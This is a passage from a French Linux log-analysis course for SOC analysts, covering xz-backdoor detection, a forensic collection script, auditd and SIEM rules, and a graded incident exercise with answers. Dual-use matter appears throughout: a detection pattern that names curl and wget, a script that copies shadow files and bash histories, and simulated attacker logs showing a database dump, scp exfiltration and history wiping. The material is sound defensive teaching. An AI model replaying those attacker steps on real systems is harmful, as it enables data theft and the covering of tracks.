   (Commande encodée en hex pour échapper aux détections basées sur strings)

4. Timeline critique :
   - JiaT75 crée son compte GitHub : octobre 2021
   - Confiance construite progressivement pendant 2 ans
   - Injection du code malveillant : fin 2023
   - Release xz 5.6.0 : 24 février 2024
   - Découverte par Andres Freund (Microsoft) : 29 mars 2024
   → 5 jours avant d'atteindre les distributions stables majeures !

5. Détection de backdoor dans bibliothèque :
   # Vérifier les checksums
   sha256sum /lib/x86_64-linux-gnu/liblzma.so.5.6.0
   dpkg --verify xz-utils
   
   # Comparer avec version officielle
   debsums xz-utils
   
   # Analyser les symboles exportés
   nm -D /lib/x86_64-linux-gnu/liblzma.so.5.6.0 | grep -i rsa
   
   # Détecter les appels système anormaux
   strace -e trace=network sshd &
   
   # Analyse statique
   strings /lib/x86_64-linux-gnu/liblzma.so.5.6.0 | grep -E "(curl|wget|exec|sh -c)"

6. Vérifications d'intégrité préventives :
   # AIDE — baseline d'intégrité des libs
   aide --check | grep liblzma
   
   # Sigvault / Sigstore — vérification signature supply chain
   cosign verify-blob --certificate xz-5.6.0.tar.gz.crt xz-5.6.0.tar.gz
   
   # Pinning de version dans /etc/apt/preferences
   Package: xz-utils
   Pin: version 5.4.*
   Pin-Priority: 1001
   
   # Politique de mise à jour : ne jamais upgrade en prod sans validation
   # Utiliser un dépôt interne versionné et audité
```

---

## MODULE 12 — Investigation Forensique sur Logs

### 12.1 Méthodologie d'investigation

```
┌──────────────────────────────────────────────────────────────┐
│              MODÈLE DFIR (Digital Forensics &                │
│              Incident Response) sur les logs                 │
├──────────────────────────────────────────────────────────────┤
│  1. PRESERVATION    Copier les logs AVANT toute analyse      │
│                     Hasher les copies (SHA256)               │
│                     Maintenir la chaîne de custody           │
│                                                              │
│  2. IDENTIFICATION  Déterminer la fenêtre temporelle         │
│                     Identifier les sources de logs           │
│                     Lister les systèmes impactés             │
│                                                              │
│  3. COLLECTE        Centraliser tous les logs pertinents     │
│                     Inclure les logs réseau (firewall)       │
│                     Récupérer les logs avant rotation        │
│                                                              │
│  4. ANALYSE         Reconstituer la timeline                 │
│                     Identifier le vecteur initial            │
│                     Tracer le mouvement latéral              │
│                     Identifier les données exfiltrées        │
│                                                              │
│  5. RAPPORT         Timeline documentée                      │
│                     IoC listés et partagés                   │
│                     Recommandations de remédiation           │
└──────────────────────────────────────────────────────────────┘
```

### 12.2 Script de collecte forensique

```bash
#!/bin/bash
# forensic_collect.sh — Collecte d'urgence post-incident

CASEDIR="/tmp/forensic_$(hostname)_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$CASEDIR"/{logs,system,network,memory}

echo "[*] Démarrage collecte forensique — $(date)"
echo "[*] Répertoire : $CASEDIR"

# ── Préservation : hash des logs avant copie
echo "[*] Hashage des logs sources..."
find /var/log -type f -exec sha256sum {} \; > "$CASEDIR/logs_hashes_before.txt"

# ── Copie des logs
echo "[*] Copie des logs..."
cp -rp /var/log "$CASEDIR/logs/"
journalctl --no-pager > "$CASEDIR/logs/journald_full.txt"
journalctl --no-pager -o json > "$CASEDIR/logs/journald_full.json"

# ── Informations système volatiles (PRIORITÉ : perdues au reboot)
echo "[*] Capture des données volatiles..."
date                          > "$CASEDIR/system/timestamp.txt"
hostname                      >> "$CASEDIR/system/timestamp.txt"
uptime                        >> "$CASEDIR/system/uptime.txt"
ps auxf                       > "$CASEDIR/system/processes.txt"
ss -tnp                       > "$CASEDIR/network/connections.txt"
ss -lnp                       >> "$CASEDIR/network/connections.txt"
netstat -rn                   > "$CASEDIR/network/routes.txt"
arp -an                       > "$CASEDIR/network/arp.txt"
ip a                          > "$CASEDIR/network/interfaces.txt"
last -F                       > "$CASEDIR/system/logins.txt"
sudo lastb -F                 > "$CASEDIR/system/failed_logins.txt"
w                             > "$CASEDIR/system/current_users.txt"
who -a                        >> "$CASEDIR/system/current_users.txt"
sudo lsof -n                  > "$CASEDIR/system/open_files.txt"
crontab -l                    > "$CASEDIR/system/crontab_current.txt"
sudo crontab -l               >> "$CASEDIR/system/crontab_current.txt"
ls /etc/cron*                 >> "$CASEDIR/system/crontab_current.txt"
find /tmp /var/tmp -type f -ls > "$CASEDIR/system/tmp_files.txt"
find / -perm -4000 -type f -ls 2>/dev/null > "$CASEDIR/system/suid_files.txt"
sudo cat /etc/passwd          > "$CASEDIR/system/passwd.txt"
sudo cat /etc/shadow          > "$CASEDIR/system/shadow_redacted.txt"
getent group                  > "$CASEDIR/system/groups.txt"
sudo systemctl list-units     > "$CASEDIR/system/services.txt"
dpkg -l                       > "$CASEDIR/system/packages.txt"
find /home /root -name "authorized_keys" -exec echo "=== {} ===" \; \
  -exec cat {} \; 2>/dev/null > "$CASEDIR/system/authorized_keys.txt"
find /home /root -name ".bash_history" -exec echo "=== {} ===" \; \
  -exec cat {} \; 2>/dev/null > "$CASEDIR/system/bash_history.txt"

# ── Hash final pour intégrité
echo "[*] Hashage des fichiers collectés..."
find "$CASEDIR" -type f -exec sha256sum {} \; > "$CASEDIR/MANIFEST.sha256"

# ── Archive
ARCHIVE="forensic_$(hostname)_$(date +%Y%m%d_%H%M%S).tar.gz"
tar czf "/tmp/$ARCHIVE" -C /tmp "$(basename $CASEDIR)"
sha256sum "/tmp/$ARCHIVE" > "/tmp/$ARCHIVE.sha256"

echo "[+] Collecte terminée"
echo "[+] Archive : /tmp/$ARCHIVE"
echo "[+] Hash    : $(cat /tmp/$ARCHIVE.sha256)"
```

---

# ═══════════════════════════════════════════════════
# NIVEAU 5 — EXPERT
# ═══════════════════════════════════════════════════

---

## MODULE 13 — auditd — Surveillance Avancée

### 13.1 Architecture et installation

```bash
$ sudo apt install auditd audispd-plugins
$ sudo systemctl start auditd
$ sudo systemctl enable auditd

# Vérifier
$ sudo auditctl -s
→ enabled 1
→ failure 1
→ pid 1234
→ rate_limit 0
→ backlog_limit 8192
→ lost 0
→ backlog 0
```

### 13.2 Règles auditd essentielles

```bash
# /etc/audit/rules.d/99-security.rules

# ── Surveiller les fichiers d'authentification
-w /etc/passwd -p wa -k auth_files
-w /etc/shadow -p wa -k auth_files
-w /etc/group -p wa -k auth_files
-w /etc/gshadow -p wa -k auth_files
-w /etc/sudoers -p wa -k sudoers

# ── Surveiller SSH
-w /etc/ssh/sshd_config -p wa -k sshd_config
-w /root/.ssh -p wa -k root_ssh
-a always,exit -F dir=/home -F name=authorized_keys -F perm=wa -k user_ssh

# ── Surveiller les exécutions de commandes sensibles
-a always,exit -F exe=/usr/bin/passwd -k passwd_change
-a always,exit -F exe=/usr/bin/ssh -k ssh_exec
-a always,exit -F exe=/bin/su -k su_exec
-a always,exit -F exe=/usr/bin/sudo -k sudo_exec

# ── Surveiller les appels système critiques
-a always,exit -F arch=b64 -S execve -F uid=0 -k root_commands
-a always,exit -F arch=b64 -S open,openat -F exit=-EACCES -k access_denied
-a always,exit -F arch=b64 -S ptrace -k ptrace

# ── Surveiller le réseau
-a always,exit -F arch=b64 -S connect -k network_connect
-a always,exit -F arch=b64 -S bind -k network_bind

# ── Surveiller les modules noyau (rootkits)
-w /sbin/insmod -p x -k modules
-w /sbin/rmmod -p x -k modules
-w /sbin/modprobe -p x -k modules

# ── Surveiller les crontabs
-w /var/spool/cron -p wa -k crontab
-w /etc/cron.d -p wa -k crontab
-w /etc/crontab -p wa -k crontab

# ── Immuable en production (ATTENTION : nécessite reboot pour changer)
# -e 2

# Appliquer
$ sudo augenrules --load
$ sudo auditctl -l    # vérifier les règles actives
```

### 13.3 Analyser les logs auditd

```bash
# Structure d'un enregistrement audit
# type=SYSCALL msg=audit(TIMESTAMP:SERIAL): ...

# Recherche par clé
$ sudo ausearch -k auth_files
$ sudo ausearch -k root_commands --start today
$ sudo ausearch -k sudo_exec --start "01/10/2024 09:00:00" --end "01/10/2024 10:00:00"

# Recherche par utilisateur
$ sudo ausearch -ua alice --start today

# Recherche par exécutable
$ sudo ausearch -x /usr/bin/passwd --start today

# Rapport formaté
$ sudo aureport --summary
$ sudo aureport -au --start today      # authentifications
$ sudo aureport --file --start today   # accès fichiers
$ sudo aureport -e --start today       # événements

# Interpréter un enregistrement complet
$ sudo ausearch -k auth_files -i | head -30
→ type=SYSCALL msg=audit(01/10/2024 09:15:00.123:456):
→   arch=x86_64 syscall=openat success=yes exit=4
→   pid=12345 ppid=12344 uid=1001 gid=1001
→   euid=0 egid=0 suid=0 sgid=0
→   comm="passwd" exe="/usr/bin/passwd"
→   key="auth_files"
→ type=PATH msg=audit(01/10/2024 09:15:00.456:457):
→   name="/etc/shadow" inode=123456 dev=08:01
→   mode=0100640 ouid=0 ogid=42
→   nametype=NORMAL
# → alice a utilisé passwd pour modifier /etc/shadow (normal)

# Cas SUSPECT : modification directe de /etc/shadow sans passer par passwd
$ sudo ausearch -f /etc/shadow -i --start today
# Si exe="vi" ou exe="nano" → SUSPECT (édition manuelle du shadow !)
```

---

## MODULE 14 — SIEM et Centralisation des Logs

### 14.1 Architecture de collecte centralisée

```
┌────────────────────────────────────────────────────────────────┐
│                  ARCHITECTURE SIEM                             │
│                                                                │
│  Sources                Collecte            SIEM              │
│  ──────                 ────────            ────              │
│  Serveurs Linux  ──┐                                          │
│  Switches        ──┼──→  rsyslog/  ──→  Elasticsearch/        │
│  Firewalls       ──┤     Filebeat/       OpenSearch +         │
│  Serveurs Web    ──┤     Logstash        Kibana/              │
│  Bases de données──┘                    OpenSearch            │
│                         (Port 514       Dashboards            │
│                          UDP/TCP)       Alertes               │
│                          (Port 5044     Corrélation           │
│                          Beats)         Rétention             │
└────────────────────────────────────────────────────────────────┘
```

### 14.2 Configuration rsyslog pour envoi centralisé

```bash
# Sur les clients — /etc/rsyslog.d/90-remote.conf

# Envoyer vers le SIEM en TCP (fiable)
*.* @@siem.entreprise.com:514

# Avec format enrichi (JSON)
template(name="ForwardFormat" type="list") {
  constant(value="{")
  constant(value="\"@timestamp\":\"")    property(name="timereported" dateFormat="rfc3339")
  constant(value="\",\"host\":\"")       property(name="hostname")
  constant(value="\",\"facility\":\"")   property(name="syslogfacility-text")
  constant(value="\",\"severity\":\"")   property(name="syslogseverity-text")
  constant(value="\",\"program\":\"")    property(name="programname")
  constant(value="\",\"pid\":\"")        property(name="procid")
  constant(value="\",\"message\":\"")    property(name="msg" format="json")
  constant(value="\"}\n")
}

action(type="omfwd"
  target="siem.entreprise.com"
  port="514"
  protocol="tcp"
  template="ForwardFormat"
  queue.type="LinkedList"
  queue.size="10000"
  queue.filename="fwdqueue"
  queue.saveOnShutdown="on"
  action.resumeRetryCount="-1")
```

### 14.3 Elastic Stack (ELK) — Règles de détection

```yaml
# Règle Kibana SIEM — Détection brute force SSH
# Fichier : ssh_brute_force_detection.json
{
  "name": "SSH Brute Force Attack",
  "description": "Détecte >10 échecs SSH depuis la même IP en 5 minutes",
  "risk_score": 75,
  "severity": "high",
  "query": "event.dataset:auth and event.action:\"failed-login\" and user.name:* ",
  "threshold": {
    "field": ["source.ip"],
    "value": 10,
    "cardinality": []
  },
  "timeframe": {"value": 5, "unit": "m"},
  "tags": ["T1110", "brute-force", "SSH"]
}

# Règle — Détection création de compte root
{
  "name": "New Root Clone Account Created",
  "description": "Nouveau compte avec UID=0 créé",
  "risk_score": 99,
  "severity": "critical",
  "query": "process.name:useradd AND process.args:\"0\"",
  "tags": ["T1136", "persistence", "privilege-escalation"]
}

# Règle — Arrêt service de logging
{
  "name": "Security Logging Disabled",
  "description": "rsyslog ou auditd arrêté par processus non-systemd",
  "risk_score": 95,
  "severity": "critical",
  "query": "process.name:systemctl AND process.args:(stop OR disable) AND process.args:(rsyslog OR auditd OR syslog)",
  "tags": ["T1562", "defense-evasion", "impair-defenses"]
}
```

---

## MODULE 15 — Cas Pratiques CTF / SOC Analyst

### 🔬 EXERCICE 15.1 — CHALLENGE FINAL : Investigation Complète

**Mission** : Vous êtes analyste SOC. Une alerte a été déclenchée à 03h47 sur le serveur `prod-api-01`. Votre mission est de reconstituer l'incident complet, identifier les données compromises, et rédiger le rapport d'incident.

```
=== LOGS COMPLETS — PROD-API-01 ===
=== PÉRIODE : 2024-01-10 03:40:00 → 03:55:00 ===

--- /var/log/nginx/access.log ---
2024-01-10T03:40:12.001Z 45.142.212.100 "GET /api/v2/health HTTP/1.1" 200 45 "-" "python-requests/2.28"
2024-01-10T03:40:13.234Z 45.142.212.100 "GET /api/v2/ HTTP/1.1" 200 234 "-" "python-requests/2.28"
2024-01-10T03:40:14.567Z 45.142.212.100 "GET /api/v2/docs HTTP/1.1" 200 15678 "-" "python-requests/2.28"
2024-01-10T03:41:22.001Z 45.142.212.100 "POST /api/v2/auth/login HTTP/1.1" 422 89 "-" "python-requests/2.28"
2024-01-10T03:41:23.456Z 45.142.212.100 "POST /api/v2/auth/login HTTP/1.1" 422 89 "-" "python-requests/2.28"
2024-01-10T03:41:24.789Z 45.142.212.100 "POST /api/v2/auth/login HTTP/1.1" 200 456 "-" "python-requests/2.28"
2024-01-10T03:41:25.012Z 45.142.212.100 "GET /api/v2/users HTTP/1.1" 403 78 "-" "python-requests/2.28"
2024-01-10T03:41:26.234Z 45.142.212.100 "GET /api/v2/admin/users HTTP/1.1" 403 78 "-" "python-requests/2.28"
2024-01-10T03:41:27.456Z 45.142.212.100 "GET /api/v2/users?role=admin HTTP/1.1" 200 12345 "-" "python-requests/2.28"
2024-01-10T03:41:28.678Z 45.142.212.100 "GET /api/v2/users?role=admin&page=2 HTTP/1.1" 200 12345 "-" "python-requests/2.28"
2024-01-10T03:41:29.890Z 45.142.212.100 "GET /api/v2/users?role=admin&page=3 HTTP/1.1" 200 11234 "-" "python-requests/2.28"
2024-01-10T03:41:30.012Z 45.142.212.100 "GET /api/v2/users/export?format=csv HTTP/1.1" 200 456789 "-" "python-requests/2.28"
2024-01-10T03:42:15.234Z 45.142.212.100 "GET /api/v2/transactions?start=2020-01-01&end=2024-01-10 HTTP/1.1" 200 9876543 "-" "python-requests/2.28"
2024-01-10T03:43:30.456Z 45.142.212.100 "GET /api/v2/payments/export?format=json HTTP/1.1" 200 12345678 "-" "python-requests/2.28"
2024-01-10T03:45:00.001Z 45.142.212.100 "DELETE /api/v2/auth/sessions HTTP/1.1" 200 45 "-" "python-requests/2.28"

--- /var/log/auth.log ---
Jan 10 03:47:33 prod-api-01 sshd[44123]: Failed password for deploy from 45.142.212.100 port 55234 ssh2
Jan 10 03:47:35 prod-api-01 sshd[44126]: Failed password for api-user from 45.142.212.100 port 55290 ssh2
Jan 10 03:47:37 prod-api-01 sshd[44129]: Failed password for ubuntu from 45.142.212.100 port 55345 ssh2
Jan 10 03:47:39 prod-api-01 sshd[44132]: Accepted password for app-runner from 45.142.212.100 port 55401 ssh2
Jan 10 03:47:39 prod-api-01 sshd[44132]: pam_unix(sshd:session): session opened for user app-runner

--- /var/log/syslog ---
Jan 10 03:47:45 prod-api-01 bash[44156]: find /var/www/api -name "*.env" -o -name "config.py" -o -name "settings.py"
Jan 10 03:47:47 prod-api-01 bash[44157]: cat /var/www/api/.env
Jan 10 03:47:50 prod-api-01 bash[44160]: cat /var/www/api/config/database.py
Jan 10 03:47:55 prod-api-01 bash[44165]: mysql -h 10.0.5.100 -u apiuser -p[REDACTED] api_production
Jan 10 03:48:02 prod-api-01 bash[44170]: mysqldump -h 10.0.5.100 -u apiuser -p[REDACTED] api_production > /tmp/db_full.sql
Jan 10 03:48:45 prod-api-01 bash[44210]: scp /tmp/db_full.sql 45.142.212.100:/tmp/
Jan 10 03:48:46 prod-api-01 bash[44211]: rm -f /tmp/db_full.sql
Jan 10 03:48:47 prod-api-01 bash[44212]: history -c
Jan 10 03:48:48 prod-api-01 bash[44213]: cat /dev/null > ~/.bash_history
Jan 10 03:48:50 prod-api-01 sshd[44132]: Disconnected from user app-runner 45.142.212.100 port 55401

--- /var/log/audit/audit.log ---
type=SYSCALL msg=audit(1704854863.001:789): arch=c000003e syscall=59 success=yes exit=0 ppid=44156 pid=44200 uid=1002 gid=1002 euid=1002 comm="bash" exe="/bin/bash" key="exec_commands"
type=EXECVE msg=audit(1704854863.002:790): argc=3 a0="cat" a1="/var/www/api/.env" a2=""
type=PATH msg=audit(1704854863.003:791): name="/var/www/api/.env" inode=567890 dev=08:01 mode=0100600 ouid=1002 ogid=1002 nametype=NORMAL key="sensitive_files"
```

**Mission complète :**

```
PARTIE A — ANALYSE TECHNIQUE (40 points)
  1. Reconstituer la timeline complète minute par minute
  2. Identifier le vecteur d'accès initial à l'API
  3. Quel mécanisme d'autorisation a été contourné ? (lignes 8-9)
  4. Calculer le volume de données exfiltrées via l'API
  5. Identifier le second vecteur d'attaque (après API)
  6. Que révèle la tentative de suppression des traces (history -c) ?

PARTIE B — ÉVALUATION DE L'IMPACT (30 points)
  7. Quelles données ont été compromises ? Classer par sensibilité
  8. Y a-t-il violation RGPD ? PCI DSS ? Justifier
  9. Évaluer si l'attaquant a encore accès au système

PARTIE C — RÉPONSE À INCIDENT (30 points)
  10. Définir les actions immédiates (< 1 heure)
  11. Définir la procédure de notification (CNIL, clients...)
  12. Lister les IoC à partager avec la communauté
  13. Recommandations pour éviter la récidive
```

**Réponses complètes :**

```
PARTIE A :

1. Timeline :
   03:40:12 → Reconnaissance API (health check, docs)
   03:41:22 → Brute force API (2 échecs HTTP 422, succès HTTP 200)
   03:41:25 → Test d'accès refusé /users, /admin/users (HTTP 403)
   03:41:27 → BYPASS IDOR : ?role=admin → HTTP 200 (vulnérabilité !)
   03:41:28 → Pagination des comptes admins (pages 1-3)
   03:41:30 → Export CSV des utilisateurs (456 KB)
   03:42:15 → Export transactions 4 ans (9.8 MB)
   03:43:30 → Export paiements JSON (12.3 MB)
   03:45:00 → Suppression de la session JWT
   03:47:33 → Brute force SSH (3 tentatives)
   03:47:39 → Intrusion SSH (compte app-runner)
   03:47:45 → Récupération secrets (.env, config)
   03:48:02 → Dump complet base de données
   03:48:45 → Exfiltration via SCP
   03:48:47 → Tentative d'effacement des traces
   03:48:50 → Déconnexion SSH

2. Vecteur initial API : brute force sur /api/v2/auth/login
   2 tentatives échouées (422 = validation error = format incorrect ?)
   3e tentative réussie (200 = token JWT obtenu)
   → Credential stuffing (credentials volés ailleurs) probable

3. IDOR — Insecure Direct Object Reference
   /api/v2/users → 403 (refusé pour utilisateur normal)
   /api/v2/admin/users → 403 (refusé)
   /api/v2/users?role=admin → 200 ! (PARAMÈTRE NON SÉCURISÉ)
   L'API fait confiance au paramètre `role` fourni par le client
   sans vérifier les droits côté serveur → OWASP A01 (BAC)

4. Volume exfiltré via API :
   Export users CSV      :  456,789 bytes  ≈ 456 KB
   Export transactions   : 9,876,543 bytes ≈ 9.4 MB
   Export payments       :12,345,678 bytes ≈ 11.8 MB
   Total API             : ≈ 21.6 MB
   + Dump SQL via SSH    : inconnu (probablement plusieurs centaines MB)

5. Second vecteur : SSH par brute force sur le compte app-runner
   (même IP = même attaquant, phase de latéralisation)

6. history -c && cat /dev/null > ~/.bash_history
   → Tentative de supprimer l'historique bash
   → MAIS : auditd a déjà capturé toutes les commandes
   → Les logs syslog ont aussi tracé les commandes bash
   → Cette tentative révèle la conscience de l'attaquant d'être traçable
   → Elle confirme une intrusion intentionnelle (preuve légale importante)

PARTIE B :

7. Données compromises par sensibilité :
   CRITIQUE - PCI DSS : Données de paiement (12.3 MB JSON)
                        Probablement : numéros de carte, CVV, dates
   CRITIQUE - RGPD : Export CSV utilisateurs admins
                     Probablement : nom, email, téléphone, adresse
   HAUTE : Historique transactions 4 ans
            Montants, dates, métadonnées financières
   HAUTE : Credentials base de données (.env)
            → Accès direct à toute la BDD production
   MODÉRÉE : Schéma BDD complet (via mysqldump)

8. Violations réglementaires :
   ✅ RGPD Art. 33 : OUI — données personnelles d'utilisateurs exfiltrées
      → Notification CNIL obligatoire sous 72h
      → Notification des personnes concernées si risque élevé
   
   ✅ PCI DSS : OUI — données de cartes bancaires exfiltrées
      → Notification du QSA (Qualified Security Assessor)
      → Notification des marques (Visa, Mastercard)
      → Investigation forensique PCI obligatoire
      → Suspension possible du droit d'accepter les paiements

9. L'attaquant a-t-il encore accès ?
   PROBABLE : 
   - Les credentials .env et database.py ont été lus
   - L'attaquant a le mot de passe MySQL → accès direct BDD
   - Le compte app-runner peut être réutilisé (mot de passe non changé)
   - Aucune backdoor visible dans les logs (mais logs partiels)
   Action immédiate : isolation réseau du serveur

PARTIE C :

10. Actions immédiates (< 1h) :
    T+0  : Isoler prod-api-01 du réseau (pas de shutdown !)
    T+5  : Changer TOUS les mots de passe (app-runner, BDD, API)
    T+10 : Révoquer TOUS les tokens JWT actifs
    T+15 : Bloquer 45.142.212.100 sur le firewall périmétrique
    T+20 : Lancer forensic_collect.sh sur le serveur isolé
    T+25 : Notifier la direction / RSSI
    T+30 : Contacter l'hébergeur pour logs réseau complémentaires
    T+45 : Identifier l'étendue : autres serveurs contactés par app-runner ?
    T+60 : Snapshot forensique de la VM

11. Notifications :
    72h : CNIL (RGPD Art. 33) — formulaire en ligne
    ASAP : Marques bancaires (PCI DSS breach notification)
    Selon risque : Notification clients concernés (RGPD Art. 34)
    Interne : Direction, DPO, Comité de direction

12. IoC à partager (via MISP / ISACs) :
    IP attaquante  : 45.142.212.100
    User-Agent     : python-requests/2.28
    CVE            : IDOR sur paramètre ?role= (0-day interne)
    Pattern URL    : GET /api/v2/users?role=admin
    Timestamps     : 2024-01-10T03:40-03:45 UTC (API)
                     2024-01-10T03:47-03:48 UTC (SSH)

13. Recommandations :
    APPLICATION :
    - Corriger l'IDOR : validation côté serveur des droits (RBAC)
    - Rate limiting sur /auth/login (max 5/min par IP)
    - Pagination sécurisée avec pagination opaque
    - Désactiver les exports massifs non justifiés
    
    INFRASTRUCTURE :
    - MFA obligatoire sur tous les comptes SSH
    - Désactiver l'authentification par mot de passe SSH
    - Segmentation : serveur API ne doit pas pouvoir SCP vers internet
    
    DÉTECTION :
    - Alerte SIEM sur export > 1MB via API
    - Alerte sur accès depuis nouvelle IP pour compte sensible
    - Alerte sur history -c (anti-forensique)
    - WAF avec règles anti-IDOR
```

---

# ANNEXES

---

## ANNEXE A — Cheatsheet Commandes Logs

```bash
# ════ LECTURE RAPIDE ════
tail -f /var/log/syslog                          # temps réel
tail -f /var/log/auth.log /var/log/syslog        # multi-fichiers
journalctl -f -u sshd                            # service spécifique
journalctl -p err -f                             # erreurs temps réel
lnav /var/log/                                   # navigateur avancé

# ════ RECHERCHE ════
grep -E "Failed|Invalid|error" /var/log/auth.log # multi-pattern
grep -C 5 "segfault" /var/log/syslog             # contexte
zgrep "ERROR" /var/log/syslog.*.gz               # fichiers compressés
journalctl -g "pattern" --since today            # journald

# ════ STATISTIQUES ════
awk '{print $5}' /var/log/syslog | sort | uniq -c | sort -rn | head
grep "Failed" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
awk '{print $9}' /var/log/nginx/access.log | sort | uniq -c | sort -rn

# ════ TEMPOREL ════
journalctl --since "1 hour ago"
find /var/log -newer /etc/passwd -type f
grep "$(date '+%b %e')" /var/log/syslog

# ════ CONNEXIONS ════
last -aF | head -30
sudo lastb -aF | head -20
lastlog
w && who -a

# ════ AUDIT ════
sudo ausearch -k auth_files --start today -i
sudo aureport --summary
find / -perm -4000 -type f -ls 2>/dev/null
```

## ANNEXE B — Fichiers de Logs par Distribution

```
Ubuntu/Debian          RHEL/CentOS/Fedora     Alpine/Docker
─────────────────      ──────────────────     ─────────────
/var/log/auth.log      /var/log/secure        journald only
/var/log/syslog        /var/log/messages      (stdout/stderr)
/var/log/kern.log      /var/log/kern.log      /var/log/messages
/var/log/dpkg.log      /var/log/yum.log       N/A
/var/log/apt/          /var/log/dnf.log
/var/log/boot.log      /var/log/boot.log
```

## ANNEXE C — Codes HTTP Suspects dans les Logs Web

```
200 après 4xx en série     → Attaque réussie après reconnaissance
500 suivi de 200           → Exploitation réussie (SQLi, RCE)
200 sur *.env / *.bak      → Fichier sensible exposé (CRITIQUE)
403 en masse               → Scan de répertoires
404 en série rapide        → Nikto / scanner web automatisé
200 sur /phpmyadmin        → Interface d'admin exposée
401 en série               → Brute force API
200 très gros body         → Exfiltration potentielle
```

## ANNEXE D — Ressources pour Aller Plus Loin

```
OUTILS OPEN SOURCE :
  Wazuh        → SIEM/HIDS open source (wazuh.com)
  Graylog      → Gestion centralisée des logs
  Elastic SIEM → Détection d'intrusion sur ELK
  Zeek         → Analyse réseau + logs
  OSSEC        → HIDS avec corrélation de logs
  TheHive      → Plateforme de réponse à incident

RÉFÉRENCES :
  MITRE ATT&CK  → attack.mitre.org (techniques d'attaque)
  OWASP Top 10  → owasp.org (vulnérabilités web)
  CVE Details   → cvedetails.com
  Shodan        → shodan.io (exposition internet)
  GreyNoise     → greynoise.io (réputation IP)
  AbuseIPDB     → abuseipdb.com (blacklist IP)

ENTRAINEMENT :
  HackTheBox    → hackthebox.com (CTF)
  TryHackMe     → tryhackme.com (guided learning)
  Blue Team Labs → blueteamlabs.online (logs forensics)
  DFIR.training → dfir.training (ressources forensiques)
```

---

*TP rédigé pour progression de zéro à niveau analyste SOC*
*Tous les logs d'exercices sont inspirés d'incidents réels documentés publiquement*
*Testez les outils dans un environnement isolé — ne jamais utiliser ces techniques sans autorisation*
